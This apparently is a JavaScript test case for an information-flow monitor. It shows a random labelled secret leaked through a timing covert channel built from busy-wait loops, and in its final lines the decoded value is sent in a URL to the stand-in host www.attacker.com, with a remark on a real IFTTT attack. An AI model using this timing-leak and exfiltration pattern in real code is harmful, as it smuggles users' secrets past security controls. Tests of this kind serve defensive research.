// Tool stops the execution correctly

function f(a) {
  while (a > 0) { a--; }
}

function bitstring(len) {
  var st = "";
  while (len > 0) { st+= Math.round(Math.random()); len--; }
  return st;
}

var asciiToBin = (function () {
    var pad = '00000000';

    return function (str) {
        return str.replace(/./g, function (c) {
            var bin = c.charCodeAt(0).toString(2);
            return pad.substring(bin.length) + bin;
        });
    };
}());

var binToAscii = function (bin) {
    return bin.replace(/[01]{8}/g, function (v) {
        return String.fromCharCode(parseInt(v, 2));
    });
};

var t =  Math.floor((Math.random() * 1000000) + 1); 

var h = t+"";  //secret value up to 1 milion + trick to covert it to String

var url = lbl(asciiToBin(h)); // convert string to binary



var i = 0;
var res = "";

while (i < 100) {
  var stime = Date.now();
  var a = lbl(1); 
  if (url.charCodeAt(i) == 48) { a = lbl(160); while (a > 0) { a--; } } // For real attack on IFTTT we set a to 1600000
  else { a = lbl(0); while (a > 0) { a--; }  }
  var etime = Date.now();
  var b = etime-stime > 0 
  if (b) { res += 0 }
  else { res += 1 } 
  i++;
}

var bb1 = binToAscii(res); // covert binary back to string

// Attempt to send string to attacker
url1 = urll("www.attacker.com" + bb1);
sink('Sink', '', url1);
